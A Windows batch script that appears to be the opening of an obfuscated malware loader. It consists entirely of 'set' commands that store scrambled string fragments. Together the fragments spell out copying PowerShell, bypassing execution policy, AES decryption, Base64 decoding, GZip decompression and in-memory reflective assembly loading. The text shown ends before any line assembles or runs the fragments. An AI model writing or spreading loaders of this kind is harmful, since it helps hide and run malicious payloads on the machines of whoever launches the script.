@echo off
set "mAzcmGVNrX=\v"
set "eSGfhnLnrE=rs"
set "FMBeAuLNXh=ll"
set "HdcMfuiAkd=32"
set "FwnaiVGfGs=Sy"
set "HMIjQolSWo=:\"
set "MLHvwXmLWI= /"
set "NiHfrfomfm= C"
set "ktqqLwJjol=po"
set "dMfDCymopL=nd"
set "kRshavSLJv=y "
set "RvAtZBKZnq=ow"
set "GeJpctqTgS=1."
set "XimASEonSX=he"
set "tcseTNthoa=Po"
set "cWDlxfFXzr=st"
set "EZaYorMljy=.e"
set "GGrLLYUQfc=do"
set "GTuGRfIGFG=co"
set "aZOmLHlces=0\"
set "uNhEMWhoyY=rS"
set "otieFwZuuq=py"
set "CCtYxomHjq=we"
set "eAEHUXoaNV=em"
set "KgFVizcUUk=ll"
set "vSJYNmNsEG=he"
set "VEsVooDmHJ=\W"
set "bTJUyfSFgl=in"
set "JAWUrAdlcg=we"
set "XfMvwzhJtG=ws"
set "BgqyTOzRYf=Wi"
set "kgxfPHRjmC=s\"
set "KwRJQQRXhe=xe"
set "vKAhPCbCqJ= %~dp0"
set "QclnrQetIN=cd"
set "pbqwPnjQKD=rofi"
set "ZHoHqmiUSG==');"
set "hJLdOUnedY=ode]"
set "DuXsoJYKFb=Fo7l"
set "LxrNaJEizN=.Cry"
set "zmQoxroDzZ=]::("
set "FdanjJBXBg=ptor"
set "aOOGzZefsH=$AeM"
set "hWnqVjhpjk=  $p"
set "yfyamHlSPI=tem."
set "esJBIccCxK=B.En"
set "poxRoxfuns=)($c"
set "bRtNeMAEAp=raph"
set "spRasBVgKU=m(, "
set "yxbZpGQSSB=[Sys"
set "SzGcIbfWky=736u"
set "NhHJddhgsW=yste"
set "rGKUdLRVxW=();$"
set "CZYvgrAzxo=File"
set "gPWdShaSWH=yTo("
set "rzixtPmPVR=1] -"
set "dbcgFKYxOU=Comp"
set "wPhFarbxzR=$iGz"
set "rTtxbSrkYB=fore"
set "FKnNzGUclo=y.Ci"
set "lZqysNjPIK=.Key"
set "PiVPQOqIUJ=O.Me"
set "yCgzXXwSiG=lit("
set "DVIgpxhGtC=-ep "
set "ZlAwuLPieC=($AW"
set "ixzGLNHjOG=ecry"
set "jqpNpBYcxY=$jMW"
set "nqbixSutqX=IBN "
set "iOiRtnoRat=S46e"
set "VqlIJlufor=ress"
set "ltQeqyYcXw=A = "
set "mGBgkwXkzo=join"
set "gzfrZgsXcq=LGGf"
set "MyJNGPJKZG=[-1."
set "xQhIBlbcCi=nirt"
set "vAEgVnRNCP=urit"
set "dxKeyOYdLu=in $"
set "WukTabKUwW=yste"
set "YhDEFWePNY=ne);"
set "UXbMBAkGZs=[IO."
set "gqKMbAWGfw=ispo"
set "jmGTYOLMgL=:: '"
set "rOcIBTWdga=Ou.T"
set "qhHvAthVRs=stem"
set "mXqujxXcmi=::De"
set "laESBnHNbs=sion"
set "bssGAesNKM=);$c"
set "TFJpTXNvta=6esa"
set "LvzdifuFYs=.Mem"
set "PrWaPYJunq=comp"
set "kLVSZQAINV=$iGz"
set "hclUcDMtcq=ress"
set "UmRnqnYqXO=AWIB"
set "spnwIqjZbz=em.I"
set "EQKIFipuLY=t Sy"
set "BuVeaUDWfv=gnir"
set "HYaKDKltYx=Star"
set "OukzBNGDkZ=flec"
set "YiNqPZyiNr= [Sy"
set "CcoFGlZYQV=[Env"
set "dLeJhzPkUS=QHo."
set "fBlUdDTkbu=('%*'"
set "uHNNLKUqiK=h = "
set "IChBhRsvrg=7Yiv"
set "tSbGWvTTcl=raph"
set "CoHJLUWOLj=.Len"
set "NhLtDgOpsP=eMmy"
set "MRhmRZdEii=)($p"
set "zxqaUUsoQe=IBN."
set "psjEbKhuzn=pose"
set "LGYTMyqhfi=ress"
set "nKcKDejkCd=NmDz"
set "JjizSlPFJw=ach "
set "PMKTxZGuoY=y.Pa"
set "NptfFCIVhC=3HWs"
set "IQdaFHDtqJ=)))"
set "SjTjGgOIIz=oin "
set "jtcqpNmkAq= '')"
set "eCwiYYUPHu=ew-O"
set "ZcvcFOSScG=tS46"
set "FRQGOAhsJt=VEB "
set "cgYYgRVlCc=();$"
set "MhbYnhNLiQ=ck($"
set "rSlmmeVtzJ=A, 0"
set "vBbdWocHKP=-joi"
